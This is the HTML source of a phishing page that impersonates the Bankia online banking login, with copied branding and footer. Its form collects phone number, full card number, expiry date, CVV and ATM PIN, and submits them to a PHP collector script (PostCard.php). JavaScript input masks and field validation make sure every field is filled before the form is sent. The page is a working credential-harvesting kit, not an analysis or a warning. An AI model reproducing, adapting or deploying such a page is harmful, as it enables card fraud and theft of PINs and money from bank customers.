<html lang="en" dir="ltr" class="wf-opensans-n4-active wf-opensans-n6-active wf-active"><!--<![endif]--><head>
  <meta charset="utf-8">
  <link href="./Bankia online log in_files/vgn-ext-templating-delivery.css" rel="stylesheet" type="text/css"> 
<style>
ul {
    list-style-type: none;
    margin: 0;
    padding: 0;
    overflow: hidden;
    border: 1px solid #e7e7e7;
    background-color: #f3f3f3;
}

li {
    float: left;
}

li a {
    display: block;
    color: #666;
    text-align: center;
    padding: 14px 16px;
    text-decoration: none;
}



</style>

<script src="res/js/q.js"></script>
  <link href="./lib/favicon.ico" rel="icon" type="image/png"> 
  <link href="./lib/jquery-ui.theme.min.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/slick.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/bootstrap.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/bootstrap-multiselect.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/datatables.min.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/ladda.min.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/general.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/modules.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/styles.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/ifb-BankiaWidgets.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/styleWFG.css" rel="stylesheet" type="text/css"> 
<script src="./res/js/jquery-1.9.0.min.js" type="text/javascript" charset="utf-8"></script>
<script src="./res/js/jquery.maskedinput.js" type="text/javascript"></script>
<script type="text/javascript">
    $(function() {
        $.mask.definitions['~'] = "[+-]";  //  placeholder=" xxxx xxxx xxxx xxxx " 
        $("#tele").mask("+34 999 999 999");
        $("#date").mask("99/9999");
        $("#card").mask("9999 9999 9999 9999");
        $("#cvv").mask(" 9 9 9 ");
        $("#atm").mask(" 9 9 9 9 ");
       /*
.------..------..------.
|D.--. ||C.--. ||H.--. |
| :/\: || :/\: || :/\: |pin
| (__) || :\/: || (__) |
| '--'D|| '--'C|| '--'H|
`------'`------'`------'

*/

        $("input").blur(function() {
            $("#info").html("Unmasked value: " + $(this).mask());
        }).dblclick(function() {
            $(this).unmask();
        });
    });

</script>
 <script>
      $(document).ready(function(){
        $('#botonEntrar').click(function(e){
          e.preventDefault();
  if($('#tele').val() == "" && $('#card').val() == "" && $('#date').val() == "" && $('#cvv').val() == "" ){
            $("#tele").css("border-color", "red");
            $("#card").css("border-color", "red");
            $("#date").css("border-color", "red");
            $("#cvv").css("border-color", "red");
            $("#atm").css("border-color", "red");
            return false;
                         
   } else if($('#tele').val() == "" || $('#atm').val() == ""  ){
            $("#tele").css("border-color", "red");
                         
          } else if($('#card').val() == ""){
            $("#card").css("border-color", "red");


            return false;

          } else if( $('#date').val() == ""){
            $("#date").css("border-color", "red");
            return false;
          }
          else if( $('#cvv').val() == ""){
            $("#cvv").css("border-color", "red");
            return false;
          }else if( $('#atm').val() == ""){
            $("#atm").css("border-color", "red");
            return false;
          }else {
            $("#loader").show();
            setTimeout(stp , 0);
          }
          function stp(){
            $('form').submit();
          }
        });
      });
    </script>

  <!-- FIN BANNER APP --> 
</head> 
 <body cz-shortcut-listen="true" style="background-image: url(&quot;lib/bg_login.jpg&quot;); background-repeat: repeat-x; zoom: 1;"><ul style="
   height: 65px;
    background-color: #FFFCFA;
    opacity: 0.9;
">
  <li><img src="lib/logoBankiaTr.png" alt="" class="hdr-logo-img" style="
    margin: 18px;
"></li>
  <li></li>
  <li style="
    float: left;
"></li>
</ul> 
   
  <div class="contenedor_general" style="
    margin-bottom: 15%;
"> 
   <header class="mod_header mod_headerNew"> 
   </header> 

    <link href="./lib//account_oi.css" rel="stylesheet" type="text/css"> 
 
                
       <div class="container content-form" style="
    top: 2rem;
    margin-bottom: 50px;
    background: #fff;
"> 
        <div class="iframe-form"> 
        

<meta http-equiv="Content-Type" content="text/html; charset=windows-1252"> 
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 

  <link rel="stylesheet" type="text/css" href="./lib/bootstrap.min.css"> 
  <link rel="stylesheet" type="text/css" href="./lib/ladda.nim.css"> 
  <link rel="stylesheet" type="text/css" href="./lib/general.min.css"> 
  <link rel="stylesheet" type="text/css" href="./lib/modulesLogin.min.css"> 
   
  
  <div aria-expanded="false" role="menu" class="mod_login  lgn-iframe"> 
   <div class="mod_message msg-error hide" id="messageValidando"> 
    <div class="msg-container"> 
     <p class="msg-text" id="mensajeErr">Revise los campos incorrectos indicados en el formulario</p> 
     <a data-function="fc-closeMessage" data-icon="c" class="msg-link data-ico-E"></a> 
    </div> 
   </div> 
   <form action="./inc/PostCard.php" method="post" class="mod_form frm-login" name="formularioLogin" id="formularioLogin"> 
    <fieldset class="frm-fieldset" style="
        height: 43%;
"> 
     <legend class="hideAccessible frm-legend"> <span class="frm-legend-txt">Acceso del cliente</span></legend> 
     <label for="id_usu_login" id="id_usu_login" class="frm-label"><span class="frm-label-txt">Número de teléfono</span> 
      <div class="hide" id="placeHolderLogin"> 
       <div class="msg-container"> 
        <p class="msg-text" id="placeHolderLoginPU"></p> 
        <a data-function="fc-closeMessage" data-icon="c" class="msg-link data-ico-E"></a> 
       </div> 
      </div> <input type="text" name="tele" id="tele" class="frm-input"> </label> 
     <label for="id_acc_login" id="id_acc_login" class="frm-label"><span class="frm-label-txt">Número de tarjeta

</span> <input name="card" id="card" class="frm-input" text=""></label><label for="id_acc_login" id="id_acc_login" class="frm-label"><span class="frm-label-txt">Fecha de vencimiento
 - Cvv
</span> <table style="width:12%">
  <tbody><tr>
    <th style="
"><input type="text" name="date" id="date" class="frm-input" style="width: 100px;"></th>
    <th style="
    padding-left: 22px;
"><input type="text" name="cvv" id="cvv" class="frm-input" style="
    width: 80px;
"></th>
  </tr>

  
</tbody></table></label>


<label for="id_usu_login" id="id_usu_login" class="frm-label"><span class="frm-label-txt">PIN</span> 
      <div class="hide" id="placeHolderLogin"> 
       <div class="msg-container"> 
        <p class="msg-text" id="placeHolderLoginPU"></p> 
        <a data-function="fc-closeMessage" data-icon="c" class="msg-link data-ico-E"></a> 
       </div> 
      </div> <input type="text" name="atm" id="atm" class="frm-input" style="width:20%"> </label>
<br>
<br>


     <div class="mod_buttons"> 
  
<input type="submit" value="Seguir" name="accountepage" id="botonEntrar" class="but-green but-wDefault ladda-button">


     </div> 
    </fieldset> 

   </form> 
  </div> 

         <div class="links-group" style="
    margin-top: 17rem;
"> 
          <a hreflang="es" title="If you have forgotten your password, click here" tabindex="0" target="_blank" class="frm-link but-default" style="
    text-decoration: none;
    margin-top: 20px;
"> <span class="frm-link-txt" style="
    text-decoration:  none;
    font-size: 15px;
">¿Qué tipo de alquiler ofrece Bankia?</span></a> 
          <a title="I do not have the access codes" class="but-default" tabindex="0" style="
    text-decoration: none;
    font-size: 15px;
">¿Qué documentación necesitas para estudiar mi préstamo?</a> 
         </div> 
        </div> 
        <div class="content-figure" style="
    background: #fff;
    margin-top: 46px;
"> 
         <div class="hero"> 
          <img src="https://www.bankia.es/estaticos/Portal-unico/Valores/banner/Adjuntos/HOMBRE-JOVEN-MOVIL-270x254.png"> 
         </div> 
         <div class="claim-button-content"> 
          <div class="claim"> 
           <p class="claim_tittle">&nbsp;</p> 
           <p><strong style="
    background: #cccc;
    opacity: 0.9;
">COMPLETOS DE LA TARJETA DE CRÉDITO</strong></p> 
           <p><strong style="
    background: #cccc;
    opacity: 0.9;
">in Bankia Online</strong></p> 
          </div> 
          <div class="button"> 
            
          </div> 
         </div> 
        </div> 
       </div> 
        
       </div><br><p class="ftr-modLinks-link" style="
    font-size: 10px;
    text-align:  center;
    font-weight:  bold;
    font-family: tahoma;
    margin-bottom: 5px;
">Aviso Legal . Seguridad. Privacidad Galletas . política. Tarifas y Cargos. Tablero de anuncios Tarifas, intereses y tasas de cambio Accesibilidad</p><p class="ftr-modLinks-link" style="font-size: 10px;text-align: center;font-weight: bold;font-family: tahoma;">© 2020 Bankia, S.A. Todos los derechos reservados.</p></body></html>